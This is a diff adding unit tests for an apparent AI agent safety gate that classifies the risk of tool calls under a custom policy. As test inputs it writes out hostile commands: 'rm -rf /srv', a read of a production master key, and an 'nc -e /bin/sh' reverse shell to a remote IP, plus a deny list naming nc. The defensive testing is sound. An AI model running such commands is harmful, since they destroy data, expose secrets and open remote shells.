@@ -122,6 +122,24 @@ class TestAgenticLoopSpecification(unittest.TestCase):
             cls, _ = WillGate.classify_tool_risk("bash", {"command": allowed_cmd}, sysadmin_profile)
             self.assertEqual(cls, "R2", f"Expected R2 for {allowed_cmd!r}")
 
+        # Policy-level customization of protected_root_dirs, forbidden_paths, and forbidden_executables
+        custom_policy_profile = {
+            "will_rules": {
+                "allow_sudo": True,
+                "protected_root_dirs": ["/", "srv"],
+                "forbidden_paths": ["/srv/production/master.key"],
+                "forbidden_executables": ["nc"],
+            }
+        }
+        cls_srv_root, _ = WillGate.classify_tool_risk("bash", {"command": "rm -rf /srv"}, custom_policy_profile)
+        self.assertEqual(cls_srv_root, "R4")
+        cls_srv_sub, _ = WillGate.classify_tool_risk("bash", {"command": "rm -rf /srv/staging/cache"}, custom_policy_profile)
+        self.assertEqual(cls_srv_sub, "R2")
+        cls_custom_path, _ = WillGate.classify_tool_risk("read", {"path": "/srv/production/master.key"}, custom_policy_profile)
+        self.assertEqual(cls_custom_path, "R4")
+        cls_custom_exec, _ = WillGate.classify_tool_risk("bash", {"command": "nc -e /bin/sh 10.0.0.1 4444"}, custom_policy_profile)
+        self.assertEqual(cls_custom_exec, "R4")
+
     def test_tool_intent_gate_typed_parameters_and_default_deny(self):
         """Validate typed parameters, allowed tools, and parameter constraints."""
         # Non-dict parameters rejected
